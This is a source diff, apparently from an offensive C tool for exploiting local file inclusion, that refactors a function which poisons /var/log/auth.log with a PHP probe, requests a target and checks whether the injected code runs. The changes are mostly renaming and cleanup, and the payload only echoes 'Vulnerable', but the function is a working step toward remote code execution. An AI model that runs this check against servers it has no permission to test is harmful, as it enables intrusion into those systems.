@@ -8,51 +8,50 @@ char *build_datawrap_url(const char *base, struct parameter_list *plist,
     int p, const char *phpcode);
 
 bool check_auth_poison(const char *target){
-    char *php_code=NULL, r_str[R_SIZE], regex[VULN_SIZE],
-    random_file[20], *mmap_str=NULL;
-    int size_file, fd;
+    char *phpcode, rstr[R_SIZE], regex[VULN_SIZE], rfile[20], *mapfile;
     bool ret = false;
-    CURL *curl=NULL;
-    FILE *x=NULL;
+    int fsize, fd;
+    CURL *curl;
+    FILE *fh;
 
-    if( (x = get_random_file(10, random_file)) == NULL)
-        die("error while generate tmp file",0);
+    if((fh = get_random_file(10, rfile)) == NULL)
+        die("error while generate tmp file", 0);
 
     curl = init_curl(NULL);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fh);
     curl_easy_setopt(curl, CURLOPT_URL, target);
 
-    random_string(r_str, R_SIZE);
-    build_regex(regex, r_str, "Vulnerable");
-    php_code = make_code(r_str, "<?php echo \"Vulnerable\"; ?>", true);
+    random_string(rstr, R_SIZE);
+    build_regex(regex, rstr, "Vulnerable");
+    phpcode = make_code(rstr, "<?php echo \"Vulnerable\"; ?>", true);
 
-    build_rce_exploit(curl, NULL, NULL, 0, AUTH, php_code);
+    build_rce_exploit(curl, NULL, NULL, 0, AUTH, phpcode);
 
     if(HttpRequest(curl)){
-        fflush(x);
-        fclose(x);
+        fclose(fh);
 
-        fd = readonly(random_file);
+        fd = readonly(rfile);
 
-        size_file = get_file_size(fd);
-        if(size_file){
-            mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
+        fsize = get_file_size(fd);
+        if(fsize){
+            mapfile = (char *) mmap(0, fsize, PROT_READ, MAP_PRIVATE, fd, 0);
 
-            if( !regex_match(AUTH_LOG_REGEX, mmap_str, size_file, PCRE_MULTILINE) )
+            if(!regex_match(AUTH_LOG_REGEX, mapfile, fsize, PCRE_MULTILINE))
                 die("[-] be sure the file is /var/log/auth.log",0);
 
-            if( regex_match(regex, mmap_str, size_file, 0) )
+            if(regex_match(regex, mapfile, fsize, 0))
                 ret = true;
         }
+
         close(fd);
     } else {
-        die("[-] without connection",0);
+        die("[-] without connection", 0);
     }
 
     curl_easy_cleanup(curl);
-    xfree(php_code);
+    unlink(rfile);
+    free(phpcode);
 
-    unlink(random_file);
     return ret;
 
 }
